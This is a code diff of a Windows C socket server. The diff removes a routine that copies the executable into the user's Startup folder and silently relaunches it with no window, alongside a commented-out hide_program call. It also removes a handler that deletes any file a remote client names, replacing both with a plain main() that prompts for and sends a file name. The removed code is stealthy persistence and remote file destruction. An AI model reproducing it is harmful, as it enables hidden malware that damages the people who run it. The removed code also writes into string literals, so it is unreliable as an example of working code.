@@ -5,7 +5,6 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <ws2tcpip.h>
-#include <shlobj_core.h>
 
 #pragma comment (lib, "Ws2_32.lib")
 #define DEFAULT_PORT             "12345"
@@ -24,58 +23,13 @@ enum run_mode {
 };
 
 
-void add_program_to_autostart() {
-    LPWSTR current_path = L"";
-    LPWSTR target_path = L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\server.exe";
-
-    LPWSTR appdata_folder = L"";
-
-    GetModuleFileName(NULL, current_path, MAX_PATH);
-    SHGetKnownFolderPath(&FOLDERID_RoamingAppData, KF_FLAG_CREATE, NULL, &appdata_folder);
-    unsigned int l = wcslen((const unsigned short *) appdata_folder);
-    wcscpy(&appdata_folder[l], target_path);
-
-    if (wcscmp(appdata_folder, current_path) == 0) return;
-
-
-
-    CopyFile(current_path, appdata_folder, 0);
-
-    STARTUPINFO startup_info;
-    PROCESS_INFORMATION process_info;
-    memset(&startup_info, 0, sizeof(STARTUPINFO));
-    startup_info.cb = sizeof(STARTUPINFO);
-    memset(&process_info, 0, sizeof(PROCESS_INFORMATION));
-
-    BOOL rv = CreateProcess(
-            appdata_folder,
-            NULL,
-            NULL,
-            NULL,
-            FALSE,
-            CREATE_NO_WINDOW,
-            NULL,
-            NULL,
-            &startup_info,
-            &process_info
-    );
-
-
-    exit(0);
-}
-
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
-                   PSTR szCmdParam, int iCmdShow) {
-//    hide_program();
-    add_program_to_autostart();
-
-
+int main() {
     WSADATA wsa_data;
     SOCKET listen_socket = INVALID_SOCKET;
     struct addrinfo hints, *result_addr = NULL;
     int result = 0;
 
-    char message[DEFAULT_MESSAGE_LEN] = "Hello from server!";
+    char message[DEFAULT_MESSAGE_LEN] = "";
     char file_name[DEFAULT_MESSAGE_LEN] = "";
 
     enum run_mode mode = ENABLED;
@@ -147,10 +101,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                 break;
             }
             default: {
-                fprintf(stdout, "File to delete: %s\n", message);
-                strcpy_s(file_name, DEFAULT_MESSAGE_LEN, message);
-
-                remove(file_name);
+                send(client_socket, file_name, sizeof(file_name), 0);
+                file_name[0] = '\0';
+                printf("Enter new file name: ");
+                scanf("%s", file_name);
 
                 break;
             }
